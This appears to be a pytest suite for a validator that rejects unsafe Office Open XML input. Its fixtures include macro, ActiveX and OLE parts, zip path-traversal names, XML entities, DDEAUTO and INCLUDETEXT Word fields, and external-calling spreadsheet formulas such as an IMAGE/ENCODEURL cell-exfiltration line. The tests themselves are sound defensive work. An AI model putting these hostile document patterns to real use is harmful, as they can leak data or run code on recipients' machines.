"""Nonexecutable OPC fixtures for the shared native Office input gate."""
from __future__ import annotations

import importlib
from pathlib import Path
import time
import zipfile

import pytest

CT_NS = 'http://schemas.openxmlformats.org/package/2006/content-types'
REL_NS = 'http://schemas.openxmlformats.org/package/2006/relationships'
OFFICE_REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
MAIN_TYPES = {'writer': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml',
              'spreadsheet': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
              'presentation': 'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml'}


def validator():
    return importlib.import_module('skills.WPSComposer.scripts.msoffice.input_validation')


def package(path, component='spreadsheet', extra_parts=None, extra_types='', rels='', main_type=None, main_xml=None):
    main = {'writer': 'word/document.xml', 'spreadsheet': 'xl/workbook.xml', 'presentation': 'ppt/presentation.xml'}[component]
    root = 'workbook' if component == 'spreadsheet' else 'presentation'
    directory, basename = main.split('/')
    contents = {
        '[Content_Types].xml': f'<Types xmlns="{CT_NS}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="bin" ContentType="application/octet-stream"/><Override PartName="/{main}" ContentType="{main_type or MAIN_TYPES[component]}"/>{extra_types}</Types>',
        '_rels/.rels': f'<Relationships xmlns="{REL_NS}"><Relationship Id="rId1" Type="{OFFICE_REL}officeDocument" Target="{main}"/></Relationships>',
        main: main_xml or f'<{root}/>',
    }
    if rels:
        contents[f'{directory}/_rels/{basename}.rels'] = f'<Relationships xmlns="{REL_NS}">{rels}</Relationships>'
    contents.update(extra_parts or {})
    with zipfile.ZipFile(path, 'w') as archive:
        for name, body in contents.items():
            archive.writestr(name, body)
    return path


@pytest.mark.parametrize('component,suffix', [('writer', '.docx'), ('spreadsheet', '.xlsx'), ('presentation', '.pptx')])
def test_accepts_normal_native_ooxml_and_preserves_bytes(tmp_path, component, suffix):
    path = package(tmp_path / ('normal' + suffix), component)
    before = path.read_bytes()
    validator().validate_native_input(path, component)
    assert path.read_bytes() == before


@pytest.mark.parametrize('component,suffix', [('writer', '.docx'), ('spreadsheet', '.xlsx'), ('presentation', '.pptx')])
def test_does_not_reject_ordinary_external_hyperlinks(tmp_path, component, suffix):
    path = package(tmp_path / ('links' + suffix), component,
                   rels=f'<Relationship Id="rId2" Type="{OFFICE_REL}hyperlink" Target="https://example.com/report" TargetMode="External"/>')
    validator().validate_native_input(path, component)


@pytest.mark.parametrize('content_type', [
    'application/vnd.ms-office.vbaProject',
    'application/vnd.ms-excel.macrosheet+xml',
    'application/vnd.ms-excel.intlmacrosheet+xml',
    'application/vnd.ms-office.activeX+xml',
    'application/vnd.openxmlformats-officedocument.oleObject',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml',
])
def test_rejects_active_content_types_with_innocuous_part_names(tmp_path, content_type):
    path = package(tmp_path / 'normal.xlsx', extra_parts={'xl/opaque.bin': b'NONEXECUTABLE'},
                   extra_types=f'<Override PartName="/xl/opaque.bin" ContentType="{content_type}"/>')
    with pytest.raises(ValueError, match=r'^Unsupported or unsafe native Office input\.$'):
        validator().validate_native_input(path, 'spreadsheet')


@pytest.mark.parametrize('rel_type', [
    'http://schemas.microsoft.com/office/2006/relationships/vbaProject',
    'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet',
    'http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary',
    OFFICE_REL + 'oleObject', OFFICE_REL + 'package', OFFICE_REL + 'externalLink',
])
def test_rejects_active_relationships_even_with_benign_content_type(tmp_path, rel_type):
    path = package(tmp_path / 'normal.xlsx', extra_parts={'xl/opaque.bin': b'NONEXECUTABLE'},
                   rels=f'<Relationship Id="rId2" Type="{rel_type}" Target="opaque.bin"/>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


@pytest.mark.parametrize('component,suffix,main_type', [
    ('spreadsheet', '.xlsx', 'application/vnd.ms-excel.sheet.macroEnabled.main+xml'),
    ('presentation', '.pptx', 'application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml'),
])
def test_rejects_macro_main_type_despite_macro_free_basename(tmp_path, component, suffix, main_type):
    path = package(tmp_path / ('ordinary' + suffix), component, main_type=main_type)
    with pytest.raises(ValueError):
        validator().validate_native_input(path, component)


def test_rejects_hidden_active_default_extension_type(tmp_path):
    path = package(tmp_path / 'normal.xlsx', extra_parts={'xl/opaque.foo': b'NONEXECUTABLE'},
                   extra_types='<Default Extension="foo" ContentType="application/vnd.ms-office.vbaProject"/>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


@pytest.mark.parametrize('target,mode', [('https://example.com/remote.png', 'External'),
                                         ('file:///private/example.xlsx', 'External'),
                                         ('https://example.com/remote.png', 'Internal')])
def test_rejects_linked_resources_other_than_hyperlinks(tmp_path, target, mode):
    path = package(tmp_path / 'normal.xlsx', rels=f'<Relationship Id="rId2" Type="{OFFICE_REL}image" Target="{target}" TargetMode="{mode}"/>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


@pytest.mark.parametrize('bad_name', ['../escape.xml', '/absolute.xml', 'xl/../escape.xml', 'xl\\opaque.xml'])
def test_rejects_noncanonical_zip_names(tmp_path, bad_name):
    path = package(tmp_path / 'normal.xlsx', extra_parts={bad_name: '<x/>'})
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


def test_rejects_duplicate_members_and_xml_entities(tmp_path):
    path = package(tmp_path / 'normal.xlsx')
    with zipfile.ZipFile(path, 'a') as archive:
        archive.writestr('XL/workbook.xml', '<workbook/>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')
    path = package(tmp_path / 'entity.xlsx', main_xml='<!DOCTYPE x [<!ENTITY a "value">]><workbook>&a;</workbook>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


def test_rejects_wrong_component_legacy_and_nonzip(tmp_path):
    mod = validator()
    path = package(tmp_path / 'normal.xlsx')
    with pytest.raises(ValueError):
        mod.validate_native_input(path, 'presentation')
    for suffix in ('.xls', '.ppt', '.xlsx'):
        legacy = tmp_path / ('legacy' + suffix)
        legacy.write_bytes(b'NONEXECUTABLE legacy-or-invalid input')
        with pytest.raises(ValueError):
            mod.validate_native_input(legacy, 'spreadsheet')


def test_honors_expired_deadline_before_reading_input(tmp_path):
    with pytest.raises(TimeoutError, match=r'^Native Office input validation timed out\.$'):
        validator().validate_native_input(tmp_path / 'not-opened.xlsx', 'spreadsheet', deadline=time.monotonic() - 1)


def test_rejects_dangling_relationship_and_oversized_xml(tmp_path):
    mod = validator()
    path = package(tmp_path / 'dangling.xlsx', rels=f'<Relationship Id="rId2" Type="{OFFICE_REL}worksheet" Target="missing.xml"/>')
    with pytest.raises(ValueError):
        mod.validate_native_input(path, 'spreadsheet')
    path = package(tmp_path / 'large.xlsx', main_xml='<workbook>' + ' ' * mod.MAX_XML_PART_BYTES + '</workbook>')
    with pytest.raises(ValueError):
        mod.validate_native_input(path, 'spreadsheet')


def test_rejects_relationship_part_misdeclared_as_plain_xml(tmp_path):
    path = package(tmp_path / 'normal.xlsx', extra_parts={'xl/opaque.bin': b'NONEXECUTABLE'},
                   extra_types='<Override PartName="/xl/_rels/workbook.xml.rels" ContentType="application/xml"/>',
                   rels=f'<Relationship Id="rId2" Type="{OFFICE_REL}package" Target="opaque.bin"/>')
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


def test_error_does_not_expose_private_filename_or_parser_content(tmp_path):
    path = package(tmp_path / 'private-customer.xlsx', main_xml='<workbook>private customer secret')
    with pytest.raises(ValueError) as raised:
        validator().validate_native_input(path, 'spreadsheet')
    assert str(raised.value) == 'Unsupported or unsafe native Office input.'


def test_accepts_normal_relative_internal_slide_relationship(tmp_path):
    path = package(tmp_path / 'normal.pptx', 'presentation',
                   extra_parts={'ppt/slides/slide1.xml': '<slide/>'},
                   rels=f'<Relationship Id="rId2" Type="{OFFICE_REL}slide" Target="slides/slide1.xml"/>')
    validator().validate_native_input(path, 'presentation')


@pytest.mark.parametrize('instruction', ['DDEAUTO server topic', 'INCLUDETEXT "external.docx"', 'LINK Excel.Sheet.12 "book.xlsx"', 'MACROBUTTON RunMe Go'])
def test_word_rejects_automatic_external_or_macro_fields(tmp_path, instruction):
    import xml.sax.saxutils
    text = xml.sax.saxutils.escape(instruction)
    ns = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
    source = f'<w:document xmlns:w="{ns}"><w:body><w:p><w:r><w:instrText>{text}</w:instrText></w:r></w:p></w:body></w:document>'
    path = package(tmp_path / 'field.docx', 'writer', main_xml=source)
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'writer')


def test_word_rejects_split_instruction_and_preserves_safe_field(tmp_path):
    ns = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
    for text, rejected in [('DDE', True), ('PAGE', False)]:
        source = f'<w:document xmlns:w="{ns}"><w:body><w:p><w:r><w:instrText>{text[:2]}</w:instrText></w:r><w:r><w:instrText>{text[2:]} </w:instrText></w:r></w:p></w:body></w:document>'
        path = package(tmp_path / 'field.docx', 'writer', main_xml=source)
        if rejected:
            with pytest.raises(ValueError):
                validator().validate_native_input(path, 'writer')
        else:
            validator().validate_native_input(path, 'writer')


@pytest.mark.parametrize('formula', ['IMAGE("https://example.invalid/"&ENCODEURL(A1))', 'RTD("existing.com.server",,"topic")', '_xlfn.RtD("server",,"topic")', 'WEBSERVICE("https://example.invalid")', 'CALL("lib","entry","J")', "'server'|'topic'!A1"])
def test_rejects_automatic_external_spreadsheet_formulas(tmp_path, formula):
    from xml.sax.saxutils import escape
    ns = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'
    path = package(tmp_path/'formula.xlsx', main_xml=f'<workbook xmlns="{ns}"><definedNames><definedName name="value">{escape(formula)}</definedName></definedNames></workbook>', extra_parts={'xl/worksheets/sheet1.xml': f'<worksheet xmlns="{ns}"><sheetData><row><c><f>{escape(formula)}</f></c></row></sheetData></worksheet>'})
    with pytest.raises(ValueError):
        validator().validate_native_input(path, 'spreadsheet')


def test_ordinary_formulas_and_literal_function_names_are_accepted(tmp_path):
    ns = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'
    path = package(tmp_path/'formula.xlsx', extra_parts={'xl/worksheets/sheet1.xml': f'<worksheet xmlns="{ns}"><sheetData><row><c><f>SUM(A1:A5)</f></c><c><f>"RTD("</f></c></row></sheetData></worksheet>'})
    validator().validate_native_input(path, 'spreadsheet')


def test_excel_backslash_does_not_escape_formula_string_quote():
    with pytest.raises(ValueError):
        validator().validate_spreadsheet_formula('="label\\"&RTD("server",,"topic")')


@pytest.mark.parametrize('ending', ['aFChunk','afChunk'])
def test_rejects_alternate_rtf_chunk_before_word_can_import_fields(tmp_path, ending):
    path = package(tmp_path/'alternate.docx', 'writer',
        extra_parts={'word/alternate.rtf': br'{\rtf1 NONEXECUTABLE {\field{\*\fldinst DDEAUTO TEST}}}'},
        extra_types='<Override PartName="/word/alternate.rtf" ContentType="application/rtf"/>',
        rels=f'<Relationship Id="rAlt" Type="{OFFICE_REL}{ending}" Target="alternate.rtf"/>')
    with pytest.raises(ValueError, match='Unsupported or unsafe'):
        validator().validate_native_input(path, 'writer')


def test_rejects_automation_formula_in_office_extended_conditional_format(tmp_path):
    path = package(tmp_path/'extended.xlsx',
        extra_parts={'xl/worksheets/sheet1.xml': '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><extLst><ext uri="test"><x14:conditionalFormattings><x14:conditionalFormatting><x14:cfRule type="expression"><xm:f>RTD("NONEXECUTABLE",,"test")</xm:f></x14:cfRule></x14:conditionalFormatting></x14:conditionalFormattings></ext></extLst></worksheet>'})
    with pytest.raises(ValueError, match='Unsupported or unsafe'):
        validator().validate_native_input(path, 'spreadsheet')
